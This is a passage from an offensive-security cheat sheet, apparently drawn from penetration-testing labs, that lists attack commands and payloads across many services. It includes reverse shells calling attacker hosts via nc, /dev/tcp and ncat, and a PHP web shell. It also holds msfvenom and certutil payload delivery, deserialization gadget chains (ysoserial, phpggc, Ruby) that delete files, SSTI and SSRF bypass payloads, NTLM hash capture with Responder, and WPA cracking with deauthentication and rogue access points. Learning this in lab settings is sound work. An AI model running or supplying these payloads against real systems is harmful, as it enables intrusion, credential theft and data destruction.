  
  -->
  ┌──(kali㉿kali)-[~]
  └─$ sudo nc -lvvvp 3306                                                              
  listening on [any] 3306 ...
  192.168.68.53: inverse host lookup failed: Host name lookup failure
  connect to [192.168.49.68] from (UNKNOWN) [192.168.68.53] 49729
  Microsoft Windows [Version 10.0.18363.900]
  (c) 2019 Microsoft Corporation. All rights reserved.
  
  C:\Windows\system32>whoami
  whoami
  slort\administrator
  
  #PrivescCheck
  PS: C:\xampp\htdocs\tmp> Import-Module .\PrivescCheck.ps1
  
  PS: C:\xampp\htdocs\tmp> Invoke-PrivescCheck -Extended
  ```

### Reverse Shells
- **Reverse Shell Example**:
  ```bash
  nc -e /bin/bash attacker.com 4444
  ```

### Remote File Inclusion (RFI)
- **RFI Example**:
  ```bash
  curl http://example.com/index.php?page=http://malicious.com/malicious_file.php
  ```
- **Using the File Parameter for an RFI Payload**:
```bash
curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt
```

- **Using a Netcat Listener to Verify RFI**:
```bash
sudo nc -nvlp 80
listening on [any] 80 ...
connect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 50324
GET /evil.txt HTTP/1.0
Host: 10.11.0.4
Connection: close
```

- **Shell Code in Evil.txt**:
```bash
cat evil.txt
<?php echo shell_exec($_GET['cmd']); ?>

```

- **Exploiting the RFI Vulnerability**:
```bash
curl http://10.11.0.22/menu.php?file=http://10.11.0.4/evil.txt&cmd=ipconfig
```

- **RFI Payload with a Windows Machine**:
```bash
# Create and modify pwn.php to execute the reverse shell
cat pwn.php
<?php
$exec = system('certutil.exe -urlcache -split -f "http://192.168.49.68/shell.exe" shell.exe', $val);
?>

# Generate the shell payload
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.49.68 LPORT=445 -f exe > shell.exe

# Deploy the payload
curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php

# Execute the shell
cat pwn.php
<?php
$exec = system('shell.exe', $val);
?>

curl http://192.168.68.53:8080/site/index.php?page=http://192.168.49.68/pwn.php
```
### Serialization and Deserialization
- **Serialization most known tricks**:
  ```python
   //Modifying serialized data types
  change the following encoded Token:
  O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"k83d4afws8dk9sou6jn2h48e5klleenm";}
  TO -->
  O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
  
  
  //Using application functionality to exploit insecure deserialization
  
  O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kufol5p36sa7weaj33subd177umbqmn6";s:11:"avatar_link";s:19:"users/wiener/avatar";}
  
  TO -->
  
  O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"kufol5p36sa7weaj33subd177umbqmn6";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
  
  //Arbitrary object injection in PHP
  
  O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"c52wutj0vzz5znns3rf2u20ylzlyptzd";}
  
  TO -->
  
  O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}	 	//__destruct() magic method is automatically invoked and will delete Carlos's file.
  
  //Exploiting Java deserialization with Apache Commons
  
  java -jar path/to/ysoserial.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
  
  
  //Exploiting PHP deserialization with a pre-built gadget chain
  
  ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64
  
  Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6
  e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBk
  ZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVt
  IjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0g
  L2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hl
  XEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENh
  Y2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2Fj
  aGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21w
  b25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMi
  O319Cg==
  
  -This will output a valid, signed cookie to the console.
  <?php
  $object = "Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==";
  $secretKey = "bcgteel0ua49lq7i0qifrywachnipspg";				//The value is in phpinfo site
  $cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
  echo $cookie;
  
  
  //Ruby universal
  
  # Autoload the required classes
  Gem::SpecFetcher
  Gem::Installer
  require 'base64'
  
  # prevent the payload from running when we Marshal.dump it
  module Gem
    class Requirement
      def marshal_dump
        [@requirements]
      end
    end
  end
  
  wa1 = Net::WriteAdapter.new(Kernel, :system)
  
  rs = Gem::RequestSet.allocate
  rs.instance_variable_set('@sets', wa1)
  rs.instance_variable_set('@git_set', "id")
  
  wa2 = Net::WriteAdapter.new(rs, :resolve)
  
  i = Gem::Package::TarReader::Entry.allocate
  i.instance_variable_set('@read', 0)
  i.instance_variable_set('@header', "aaa")
  
  
  n = Net::BufferedIO.allocate
  n.instance_variable_set('@io', i)
  n.instance_variable_set('@debug_output', wa2)
  
  t = Gem::Package::TarReader.allocate
  t.instance_variable_set('@io', n)
  
  r = Gem::Requirement.allocate
  r.instance_variable_set('@requirements', t)
  
  payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])
  #puts payload.inspect
  #puts Marshal.load(payload)
  puts Base64.encode64(payload)
  ```

### Shellshock
- **Shellshock Example**:
  ```bash
  env x='() { :;}; echo vulnerable' bash -c "echo hello"
  ```
- **Shellshock basic payload**:
  ```bash
  GET /cgi-bin/admin.cgi HTTP/1.1
  Host: 10.11.1.71
  User-Agent: () { :;}; /bin/bash -i >& /dev/tcp/192.168.119.139/443 0>&1
  ```

### Server Message Block (SMB)
- **SMB Example**:
  ```bash
  smbclient \\target\share
  ```
- **SMB basic enumeration: Using nmap to scan for the NetBIOS service**:
  ```bash
  nmap -v -p 139,445 -oG smb.txt 10.11.1.1-254
  ```
- **#Using nbtscan to collect additional NetBIOS information**:
  ```bash
  sudo nbtscan -r 10.11.1.0/24
  ```
- **Using the nmap scripting engine to perform OS discovery**:
  ```bash
  nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227

  ```
- **Determining whether a host is vulnerable to the MS08_067 vulnerability**:
  ```bash
  nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.11.1.5
  ```
- **URI File Attack**:
  ```bash
  ┌──(kali㉿kali)-[~]
  └─$ cat @hax.url 
  [InternetShortcut]
  URL=anything
  WorkingDirectory=anything
  IconFile=\\192.168.118.14\%USERNAME%.icon
  IconIndex=1
  
  -->
  ┌──(kali㉿kali)-[~]
  └─$ sudo responder -I tap0 -v
  ...
  [+] Listening for events...
  ...
  
  -->
  smb: \> put @hax.url 
  putting file @hax.url as \@hax.url (1.2 kb/s) (average 1.2 kb/s)
  smb: \> quit
  
  --> 
  get the hashes
  ```

### Simple Mail Transfer Protocol (SMTP)
- **SMTP Example**:
  ```bash
  telnet smtp.target.com 25
  ```
- **Using nc to validate SMTP users**:
  ```bash
  nc -nv 10.11.1.217 25
  VRFY root
  VRFY idontexist
  ^C
  ```
- **Testing Anonymous SMTP Connections**:
  ```bash
  #command: nc -C 192.168.168.55 25
  220 mailserver.domain.com Microsoft ESMTP MAIL Service, Version: 5.0.2195.5329 ready at  Sat, 22 May 2012 09:01:29 +0200
  helo myserver.domain.com
  250 mailserver.domain.com Hello [10.12.150.2]
  mail from:<myname@mydomain.com>
  250 2.1.0 myname@mydomain.com....Sender OK
  rcpt to:<recipientname@mydomain.com>
  250 2.1.5 recipientname@mydomain.com
  data
  354 Start mail input; end with <CRLF>.<CRLF>
  subject: This is a test mail
  to: recipientname@mydomain.com
  This is the text of my test mail.
  .
  250 2.6.0 <exchange.domain.com> Queued mail for delivery
  quit
  
  #Other Example
  250 2.6.0 <VICTIMFRaqbC8wSA1Xv00000002@VICTIM> Queued mail for delivery
  HELO
  MAIL FROM: asdf@asdf.com
  250 2.1.0 asdf@asdf.com....Sender OK
  RCPT TO:lhale@victim
  250 2.1.5 lhale@victim 
  DATA
  354 Start mail input; end with <CRLF>.<CRLF>
  Subject: job application
  urgent
  
  http://192.168.119.168/test
  .
  250 2.6.0 <VICTIMPbDfzlu76c5KK00000003@VICTIM> Queued mail for delivery
  ```
- **SMTP User enumeration python script**:
  ```bash
  #!/usr/bin/python

  import socket
  import sys
  
  if len(sys.argv) != 2:
          print "Usage: vrfy.py <username>"
          sys.exit(0)
  
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  connect = s.connect(('10.11.1.217',25))
  
  banner = s.recv(1024)
  print banner
  
  s.send('VRFY ' + sys.argv[1] + '\r\n')
  result = s.recv(1024)
  print result
  s.close()
  ```


### Simple Network Management Protocol (SNMP)
- **SNMP Example**:
  ```bash
  snmpwalk -v 2c -c public 192.168.1.1
  ```
- **using snmp-check to scan for a running SNMP service on the target.**:
  ```bash
  snmp-check 192.168.208.42
  ```
- **Using nmap to perform a SNMP scan**:
  ```bash
  sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
  ```
- **Using onesixtyone to brute force community strings**:
  ```bash
  echo public > community
  echo private >> community
  echo manager >> community
  for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips
  onesixtyone -c community -i ips
  ```
- **Using snmpwalk to enumerate the entire MIB tree, enumerate Windows users, processes, installed softwares and TCP open ports**:
  ```bash
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.4.1.77.1.2.25
  snmpwalk -c public -v1 10.11.1.73 1.3.6.1.2.1.25.4.2.1.2
  snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
  snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2 
  ```
- **Some Windows SNMP MIB values**:
  ```bash
  1.3.6.1.2.1.25.1.6.0	System Processes
  1.3.6.1.2.1.25.4.2.1.2	Running Programs
  1.3.6.1.2.1.25.4.2.1.4	Processes Path
  1.3.6.1.2.1.25.2.3.1.4	Storage Units
  1.3.6.1.2.1.25.6.3.1.2	Software Name
  1.3.6.1.4.1.77.1.2.25	User Accounts
  1.3.6.1.2.1.6.13.1.3	TCP Local Ports
  ```

### Server-Side Request Forgery (SSRF)
- **SSRF Example**:
  ```bash
  curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'
  ```
- **Basic SSRF against the local server(Change any URL vaule to local values)**:
  ```bash
  API=http://localhost/admin/delete?username=carlos
  ```
- **Basic SSRF against another back-end system**:
  ```bash
  Intruder --> stockApi=http://192.168.0.§y§:8080/admin
  API=http://192.168.0.240:8080/admin/delete?username=carlos
  ```
- **SSRF with blacklist-based input filter**:
  ```bash
  API=http://127.1/admin/delete?username=carlos
  API=http://127.1/%2561dmin/delete?username=carlos
  ```
- **SSRF with filter bypass via open redirection vulnerability**:
  ```bash
  URL/product/nextProduct?currentProductId=1&path=/product?productId=2					//Entrypoint
  API= /product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos			//Manipulation
  ```
- **Blind SSRF with out-of-band detection**:
  ```bash
  Referer Header --> Collaborator DNS 
  ```
- **SSRF with whitelist-based input filter**:
  ```bash
  [curl -X POST http://target.com/api/v1/resource -d 'url=http://internal-server'](http://127.0.0.1/											//Does not work
  http://username@stock.weliketoshop.net/									//Works, aber Append a # to the username and observe that the URL is now rejected
  http://localhost:80%2523@stock.weliketoshop.net/admin/delete?username=carlos				// It works..Double-URL encode the # to %2523)
  ```
- **Blind SSRF with Shellshock exploitation**:
  ```bash
  GET /product?productId=2 HTTP/1.1
  Host: 0ade009804d9c672c0973f1000a70011.web-security-academy.net
  Cookie: session=68HsKn4XtgnsWRp1leKOfwkIYVz5ctv6
  ..
  User-Agent: () { :; }; /usr/bin/nslookup $(whoami).nwn3o2b3c2kc4yi5aud1j1v7qywpkg85.oastify.com
  Referer:http://192.168.0.§1§:8080
  ```
- **Using redirect techniques to bypass  this SSRF protection.**:
  ```bash
  1- Building the own server
    from flask import Flask
    app = Flask(__name__)
    @app.route('/')
    def home():
      return redirect("http://127.0.0.1/secret", code=302)
    app.run()
  2- Tunnel to expose the local ip
       npm install -g localtunnel
       npx lt -p 5000
  ```

### Server-Side Template Injection (SSTI)
- **SSTI Example**:
  ```html
  {{ config }}
  ```
- **SSTI basich payloads**:
  ```html
  {7*7}
  {{7*7}}
  {{7*'7'}}
  {{_self.env.registerUndefinedFilterCallback("exec")}}
  {{_self.env.getFilter("id")}}
  {{_self.env.registerUndefinedFilterCallback("exec")}}
  {{_self.env.getFilter("ncat -e /bin/bash 192.168.120.51 1234")}}
  <%= 7*7 %>											//ERB template
  <%= system("whoami") %>										//ERB template
  blog-post-author-display=user.name}}{{7*7}}							//Tornado template
  blog-post-author-display=user.name}}{%25+import+os+%25}{{os.system('whoami')			//Tornado template
  ${7*7}
  ${foobar}											//Identify the template engine( FreeMarker) with error messages
  <#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }			//FreeMarker template
  ${{<%[%'"}}%\											//Identify the template engine(Handlebars) with error messages

  ```
- **SSTI: server-side template injection well-known exploit**:
  ```html
  #Handlebars 
  wrtz{{#with "s" as |string|}}
    {{#with "e"}}
        {{#with split as |conslist|}}
            {{this.pop}}
            {{this.push (lookup string.sub "constructor")}}
            {{this.pop}}
            {{#with string.split as |codelist|}}
                {{this.pop}}
                {{this.push "return require('child_process').exec('rm /home/carlos/morale.txt');"}}
                {{this.pop}}
                {{#each conslist}}
                    {{#with (string.sub.apply 0 codelist)}}
                        {{this}}
                    {{/with}}
                {{/each}}
            {{/with}}
        {{/with}}
    {{/with}}
  {{/with}}
  0%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%6970%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b[URL-encoded]-->end
  
  ${{<%[%'"}}%\											//Identify the template engine(Django) with error messages
  {% debug %}											//Django framework 
  {{settings.SECRET_KEY}}										//Django framework 
  
  ${object.getClass()}
  ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
  ```

### Symfony
- **Symfony Example**:
  ```bash
  php bin/console server:start
  ```
- **Symfony: some usefull links and tricks**:
  ```bash
  #Getting the secret
  #https://www.synacktiv.com/en/publications/looting-symfony-with-eos.html
  
  http://192.168.56.2/app_dev.php/_profiler/open?file=app/config/parameters.yml
  
  #_fragment exploitation
  #https://www.ambionics.io/blog/symfony-secret-fragment
  #https://github.com/ambionics/symfony-exploits
  
  git clone https://github.com/ambionics/symfony-exploits  
  python3 secret_fragment_exploit.py -s 48a8538e6260789558f0dfe29861c05b http://192.168.120.194
  
  python3 secret_fragment_exploit.py 'http://192.168.56.2/_fragment' --method 1 --secret '48a8538e6260789558f0dfe29861c05b' --algo 'sha256' --internal-url 'http://192.168.56.2/_fragment' --function system --parameters command:"bash -c 'bash -i >& /dev/tcp/192.168.56.1/80 0>&1'"  return_value:null
  
  http://192.168.56.2/_fragment?_path=command%3Dbash%2B-c%2B%2527bash%2B-i%2B%253E%2526%2B%252Fdev%252Ftcp%252F192.168.56.1%252F80%2B0%253E%25261%2527%26return_value%3Dnull%26_controller%3Dsystem&_hash=ZbBPtkD0bYhNLAGb6Nk%2BCBrJppgMGHje9%2BQ0rbQZ4ng%3D
  ```

### Trivial File Transfer Protocol (TFTP)
- **Basic Enumeration**:
  ```bash
  #nmap scan
  nmap -n -Pn -sU -p69 -sV --script tftp-enum <IP>
  
  #msfconsole - Download-Upload
  msf5> auxiliary/admin/tftp/tftp_transfer_util
  ```
- **Basic Downloading/Uploading python**:
  ```bash
  import tftpy
  client = tftpy.TftpClient(<ip>, <port>)
  client.download("filename in server", "/tmp/filename", timeout=5)
  client.upload("filename to upload", "/local/path/file", timeout=5)
  ```

### Web Cache Poisoning
- **Web Cache Poisoning Example**:
  ```bash
  curl -H "X-Forwarded-For: 127.0.0.1" http://example.com/resource
  ```
- **Web Cache Poisoning- basic tricks to check**:
  ```bash
  - Change the URL PATH(f.e. ?asd=asd) and check the X-Cache header whether it is miss or hit.
  - If not works, use the Origin header as a cache buster.
  - Find a place where you can cache input to response. Try X-Forwarded-Host:example.com and check the response.
  - Try to check cookies or other headers that return in the response (fehost=someString"-alert(1)-"someString).
  - Try to change the request Path (GET /?evil='/><script>alert(1)</script>).
  - Try to find other params with param miner.
  - Inject the place with XSS or in the Exploit Server write alert(document.cookie) and bind the exploit URL to the cached response.
  - Try to check with multiple headers:
    - X-Forwarded-Scheme: nothttps
    - X-Forwarded-Host:exploit-0a3700c604474181c08db80f01b10022.exploit-server.net
  - Using an unknown Header (Param Miner, f.e., X-Host: World.com).
  - If you're struggling, you can use the Pragma: x-get-cache-key header to display the cache key in the response. This applies to some of the other labs as well.
  - Websites often exclude certain UTM analytics parameters from the cache key (utm_content).
  - Web cache poisoning with an unkeyed header.

  ```
- **Web Cache Poisoning basic example**:
  ```bash
  Request:
  GET / HTTP/1.1
  Host: 0ab400e90374f20ec0ab2eac003d0023.web-security-academy.net
  X-Forwarded-Host:exploit-0aba000c032af203c0e12e3f01fd002b.exploit-server.net
  
  Response:
  X-Cache: hit
   
  Exploit Server:
  alert(document.cookie)
  ```

### Wireless Vulnerabilities
- **Wireless most known tricks**:
  ```bash
  #Determining the Wireless Chipset
  sudo lsusb -vv
  --> Output: idVendor           0x148f Ralink Technology, Corp.
      idProduct          0x5370 RT5370 Wireless Adapter
  
  #Getting a DHCP lease on wlan0
  sudo dhclient wlan0
  
  #Listing support modes on all wireless interfaces
  sudo iw list
  
  #Setting the IP address to wlan0
  sudo ip link set wlan0 up
  sudo ip addr add 10.0.0.1/24 dev wlan0
  
  
  #airmon-ng|iw
  ###############
  #Checking for network managers using Airmon-ng
  sudo airmon-ng check
  
  #Killing network managers with Airmon-ng
  sudo airmon-ng check kill
  
  #Airmon-ng enabling monitor mode on wlan0
  sudo airmon-ng start wlan0
  
  #Using --verbose with Airmon-ng
  sudo airmon-ng --verbose
  
  #Using debug with airmon-ng
  sudo airmon-ng --debug
  
  #Airmon-ng enabling monitor mode on wlan0, channel 3
  sudo airmon-ng start wlan0 3
  
  #Checking current channel using iw
  sudo iw dev wlan0mon info
  
  #Using stop option with Airmon-ng
  sudo airmon-ng stop wlan0mon
  
  
  #airodump-ng
  ###############
  #Airodump-ng options
  #-w prefix	Saves the capture dump to the specified filename
  #--bssid BSSID	Filters Airodump-ng to only capture the specified BSSID
  #-c channel(s)	Forces Airodump-ng to only capture the specified channel(s)
  
  #Airodump command on a fixed channel
  sudo airodump-ng wlan0mon -c 2
  
  #Airodump-ng focused on a channel and BSSID
  sudo airodump-ng -c 3 --bssid 34:08:04:09:3D:38 -w cap1 wlan0mon
  
  #executing airodump-ng with the -w option, followed by a filename prefix writes the output to a number of formats
  sudo airodump-ng --output-format csv,pcap wlan0mon
  
  #aireplay-ng
  ###############
  #Aireplay-ng injection test
  sudo airmon-ng start wlan0 3
  sudo aireplay-ng -9 wlan0mon
  
  #Aireplay-ng injection test focused on an ESSID/BSSID
  sudo aireplay-ng -9 -e wifu -a 34:08:04:09:3D:38 wlan0mon
  
  #Aireplay-ng card-to-card injection test
  sudo aireplay-ng -9 -i wlan1mon wlan0mon
  
  #aircrack-ng
  ###############
  #Benchmark on all CPUs
  aircrack-ng -S
  
  #airdecap-ng
  ###############
  #Airdecap-ng removing wireless headers
  sudo airdecap-ng -b 34:08:04:09:3D:38 opennet-01.cap
  
  #airgraph-ng
  ###############
  #Let's run Airgraph-ng with the -o option to output to a file name, the -i option to input an Airodump-ng .csv file, and -g to define a CAPR graph
  #To create this graph with our Airodump-ng .csv file, we'll use the -g CPG option
  airgraph-ng -o Picture1_png -i dump-01.csv -g CAPR
  airgraph-ng -o Picture2.png -i dump-01.csv -g CPG
  
  #all-together
  #############
  #Airodump-ng command and output on channel 3, focused on a BSSID
  #Deauthenticating client with aireplay
  #Cracking the The WPA shared key
  #Using airdecap-ng to decrypt the traffic
  sudo airodump-ng wlan0mon
  sudo airodump-ng -c 3 -w wpa --essid wifu --bssid 34:08:04:09:3D:38 wlan0mon
  sudo aireplay-ng -0 1 -a 34:08:04:09:3D:38 -c 00:18:4D:1D:A8:1F wlan0mon
  aircrack-ng -w /usr/share/john/password.lst -e wifu -b 34:08:04:09:3D:38 wpa-01.cap
  airdecap-ng -b 34:08:04:09:3D:38 -e wifu -p 12345678 wpa-01.cap
  
  #Custom Wordlists with Aircrack-ng
  ##################################
  #Listing all lines containing "password"
  grep -i password /usr/share/john/password.lst
  
  #Adding two mangling rules to JtR
  sudo nano /etc/john/john.conf
  --> Add two-three numbers to the end of each password 
  
  $[0-9]$[0-9]
  $[0-9]$[0-9]$[0-9]
  
  #Testing mangling rules with JtR
  john --wordlist=/usr/share/john/password.lst --rules --stdout | grep -i Password123
  
  #Using Crunch to generate wordlist with the charset abc123 with word between 8 and 9 characters
  crunch 8 9 abc123
  
  #Using Crunch to generate wordlist with starting with password and ending with three digits
  crunch 11 11 -t password%%%
  
  #Using Crunch to generate wordlist starting with 'password' and ending with three digits - Alternate version
  crunch 11 11 0123456789 -t password@@@
  
  #Using Crunch to generate wordlist using characters in 'abcde12345' without repeating any of them
  #The -p option generates unique words from a character set or a set of whole words. Although we still need to provide the minimum and maximum length, those numbers are ignored
  crunch 1 1 -p abcde12345
  
  #Using Crunch to generate wordlist with multiple words instead of characters, without repeating them
  crunch 1 1 -p dog cat bird
  
  #Using Crunch to generate wordlist with multiple words instead of characters, without repeating them and adding two digits
  crunch 5 5 -t ddd%% -p dog cat bird
  
  #Using Crunch to generate a non-repeating wordlist from multiple words and adding two characters from a defined character set
  crunch 5 5 aADE -t ddd@@ -p dog cat bird
  
  #Combining Crunch mangling and piping it to aircrack-ng
  crunch 11 11 -t password%%% | aircrack-ng -e wifu crunch-01.cap -w -
  
  #Using Aircrack-ng with RSMangler
  echo bird > wordlist.txt
  echo cat >> wordlist.txt
  echo dog >> wordlist.txt
  rsmangler --file wordlist.txt
  
  #RSMangler output to a file
  rsmangler --file wordlist.txt --output mangled.txt
  
  #Concatenated wordlist piped into RSMangler
  cat wordlist.txt | rsmangler --file -
  
  #Mangling wordlist using RSMangler and limiting to 12-13 characters
  rsmangler --file wordlist.txt --min 12 --max 13
  
  #Combining RSMangler mangling and piping it to Aircrack-ng
  rsmangler --file wordlist.txt --min 12 --max 13 | aircrack-ng -e wifu rsmangler-01.cap -w -
  
  #Displaying properties of a Skylake CPU using hashcat
  hashcat -I
  
  #Benchmarking the Skylake CPU using hashcat
  hashcat --help
  hashcat -b -m 2500
  
  #Installing hashcat utilities
  sudo apt install hashcat-utils
  
  #Converting PCAP to hccapx for hashcat
  #Note that aircrack-ng can also use .hccapx files as input for cracking.
  /usr/lib/hashcat-utils/cap2hccapx.bin wifu-01.cap output.hccapx
  
  #Cracking with hashcat
  hashcat -m 2500 output.hccapx /usr/share/john/password.lst
  
  #Airolib-ng
  ###########
  #Adding the target ESSID to a file
  echo wifu > essid.txt
  
  #Importing the ESSID with airolib-ng
  airolib-ng wifu.sqlite --import essid essid.txt
  
  # Viewing the airolib-ng database statistics
  airolib-ng wifu.sqlite --stats
  
  #Importing passwords into the airolib-ng database
  airolib-ng wifu.sqlite --import passwd /usr/share/john/password.lst
  
  #Generating the PMKs for the ESSID
  airolib-ng wifu.sqlite --batch
  airolib-ng wifu.sqlite --stats
  
  #Recovering the WPA password with the airolib-ng database
  aircrack-ng -r wifu.sqlite wpa1-01.cap
  
  #coWPAtty
  
  #Creating pre-computed hash tables using genpmk
  #We run genpmk with -f to define our wordlist, -d to output to a file, and -s to specify the ESSID
  genpmk -f /usr/share/john/password.lst -d wifuhashes -s wifu
  
  #Using pre-computed hashtables with coWPAtty
  cowpatty -r wpajohn-01.cap -d wifuhashes -s wifu
  
  #Attacking WPS
  ##############
  #Wash displaying WPS information for each AP
  wash -i wlan0mon
  
  #using reaver to attack our wifu AP. 
  #We have to specify the BSSID of the AP we gathered earlier using wash with -b, the wireless interface using -i, and a very verbose output with -vv.
  #Launching attack using reaver
  sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v
  
  # Using PixieWPS attack with reaver
  #One alternative to this method is to use bully with -d, which will attempt to run PixieWPS with the values we recovered from bully
  sudo reaver -b 34:08:04:09:3D:38 -i wlan0mon -v -K
  
  
  #Checking the first three bytes of the BSSID against known PINs
  sudo apt install airgeddon
  source /usr/share/airgeddon/known_pins.db
  echo ${PINDB["0013F7"]}
  
  #Rogue Access Points
  ####################
  
  #Discovery via airodump-ng
  sudo airodump-ng -w discovery --output-format pcap wlan0mon
  
  #Building the hostapd-mana Configuration
  #The simplest configuration for hostapd-mana
  kali@kali:~$ cat Mostar-mana.conf
  interface=wlan0
  ssid=Mostar
  channel=1
  
  #Adding hw_mode to the config file
  #Adding security configuration
  #Final Mostar-mana.conf
  kali@kali:~$ cat Mostar-mana.conf
  interface=wlan0
  ssid=Mostar
  channel=1
  hw_mode=g
  ieee80211n=1
  wpa=3
  wpa_key_mgmt=WPA-PSK
  wpa_passphrase=ANYPASSWORD
  wpa_pairwise=TKIP
  rsn_pairwise=TKIP CCMP
  mana_wpaout=/home/kali/mostar.hccapx
  
  #Running hostapd-mana
  sudo hostapd-mana Mostar-mana.conf
  
  #Deauthenticating clients
  sudo aireplay-ng -0 0 -a FC:7A:2B:88:63:EF wlan1mon
  
  #Capturing handshakes from deauthenticated clients
  kali@kali:~$ sudo hostapd-mana Mostar-mana.conf 
  Configuration file: Mostar-mana.conf
  MANA: Captured WPA/2 handshakes will be written to file 'mostar.hccapx'.
  Using interface wlan0 with hwaddr 2e:0b:05:98:f8:66 and ssid "Mostar"
  wlan0: interface state UNINITIALIZED->ENABLED
  wlan0: AP-ENABLED 
  ...
  MANA: Captured a WPA/2 handshake from: fe:5c:f4:2b:d4:3e
  wlan0: AP-STA-POSSIBLE-PSK-MISMATCH fe:5c:f4:2b:d4:3e
  
  #Cracking the WPA/2 Hash
  aircrack-ng mostar.hccapx -e Mostar -w /usr/share/john/password.lst
  
  
  #Attacking WPA Enterprise
  #########################
  
  #Airodump-ng command and output
  sudo airodump-ng wlan0mon
  
  #Installing freeradius
  sudo apt install freeradius
  
  #certificate_authority section in ca.cnf
  kali@kali:~$ sudo -s
  root@kali:/home/kali# cd /etc/freeradius/3.0/certs
  root@kali:/etc/freeradius/3.0/certs# nano ca.cnf
  
  ...
  [certificate_authority]
  countryName             = US
  stateOrProvinceName     = CA
  localityName            = San Francisco
  organizationName        = Playtronics
  emailAddress            = ca@playtronics.com
  commonName              = "Playtronics Certificate Authority"
  ...
  
  #server section in server.cnf
  root@kali:/etc/freeradius/3.0/certs# nano server.cnf
  
  ...
  [server]
  countryName             = US
  stateOrProvinceName     = CA
  localityName            = San Francisco
  organizationName        = Playtronics
  emailAddress            = admin@playtronics.com
  commonName              = "Playtronics"
  ...
  
  #Certificate generation
  root@kali:/etc/freeradius/3.0/certs# rm dh
  root@kali:/etc/freeradius/3.0/certs# make
  
  #HostAPd configuration file, mana.conf
  #up to --> EOF
  # SSID of the AP
  ssid=Playtronics
  # Network interface to use and driver type
  # We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
  interface=wlan0
  driver=nl80211
  # Channel and mode
  # Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
  channel=1
  # Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
  hw_mode=g
  # Setting up hostapd as an EAP server
  ieee8021x=1
  eap_server=1
  # Key workaround for Win XP
  eapol_key_index_workaround=0
